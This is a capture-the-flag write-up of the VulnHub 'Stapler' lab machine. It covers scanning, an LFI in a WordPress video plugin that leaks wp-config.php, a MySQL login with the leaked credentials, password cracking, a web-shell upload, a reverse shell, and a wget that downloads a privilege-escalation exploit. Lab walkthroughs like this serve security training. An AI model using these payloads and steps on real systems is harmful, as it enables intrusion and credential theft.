Title: Stapler
Date: 2016-08-10 22:38
Category: VulnHub CTF

**This is a Stapler challenge from vulnhub.com. You can obtain the virtual
machine from: [here](https://www.vulnhub.com/entry/stapler-1,150/)**

'''
The primary object is to got root.
'''

Our nmap scan:

![](images/StaplerPics/1_nmap.png)

After running nmap script scan with -A switch:

```
nmap -A -T4 -p- 10.0.0.142
```
- Ftp Anon login allowed
![](images/StaplerPics/2_ftp_anon.png)

Base on what we found on the ftp we were able to enumerate these usernames:

- Harry
- Elly

port 12380 turn out to be web server:

![](images/StaplerPics/3_12380.png)

Another username:

- Tim

Scanning the web server:

![](images/StaplerPics/4_nikto_gimp.png)

![](images/StaplerPics/5_dirb_http.png)

![](images/StaplerPics/5_dirb_https.png)

It's look like the webserver on port 12380 serve http and https both on port
12380.From the robots.txt we found beef hook at admin112233 :D and what's look
like wordpress blog.

This is the results from the scans with wpscan:

Plugins enumeration:
![](images/StaplerPics/6_wpscan_enumerate_p.png)

and usernames enumeration:
![](images/StaplerPics/6_wpscan_enumerate_u.png)

Advanced video plugin is vulnerable to LFI.
![](images/StaplerPics/7_vulnerable_adv_vid.png)

This is the link to the available exploit: [exploit-db](https://www.exploit-db.com/exploits/39646/)

It's look like we could read the content of wp-config.
We were able to post on the blog with entering this url:

```
 https://10.0.0.142:12380/blogblog//wp-admin/admin-ajax.php?action=ave_publishPost&title=RANDOMSTR&short=rnd&term=rnd&thumb=../wp-config.php   
```
This created new post on the blog for us:

![](images/StaplerPics/8_post_created.png)

This is where the post was created:

![](images/StaplerPics/9_locate_LFI.png)

This image probably contain the content of wp-config.php.

![](images/StaplerPics/10_img_error.png)

So to be able to read the content lets download it with curl:

![](images/StaplerPics/11_wp_conf_dl.png)

MYSQL credentials: **root:plbkac**

Connect to the target on port 3306 mysql:

```
mysql --user=root --password=plbkac -h 10.0.0.142
```

The databases on the target:

![](images/StaplerPics/12_databases.png)

```
use wordpress;
```

```
show tables;
```
![](images/StaplerPics/12_1_wp_tables.png)

```
select * from wp_users;
```
![](images/StaplerPics/13_wp_users.png)

Ok now we have the hashes of all users on the wordpress blog. It's time to crack
them. After a while we got the admin account of john:

![](images/StaplerPics/14_john.png)

![](images/StaplerPics/15_web_admin.png)

We can't install plugin on the wp blog because we need ftp credentials.

![](images/StaplerPics/16_cant_upload.png)

Despite the error and the fact we haven't the ftp credentials of john our atempt
to upload b374k shell as plugin ended up uploaded in the media dir:

![](images/StaplerPics/17_media.png)

Now we have shell access to the target:

![](images/StaplerPics/18_shell.png)

Start reverse shell from b374k to our attacker machine:

![](images/StaplerPics/19_start_reverse_shell.png)

Catch the reverse shell and find out whoami and operation system version:

![](images/StaplerPics/20_catch_shell.png)

For ubuntu 16.04 there is privelege escalation exploit:

```
wget https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip
```

After compile and execute the exploit:

![](images/StaplerPics/21_flag.png)
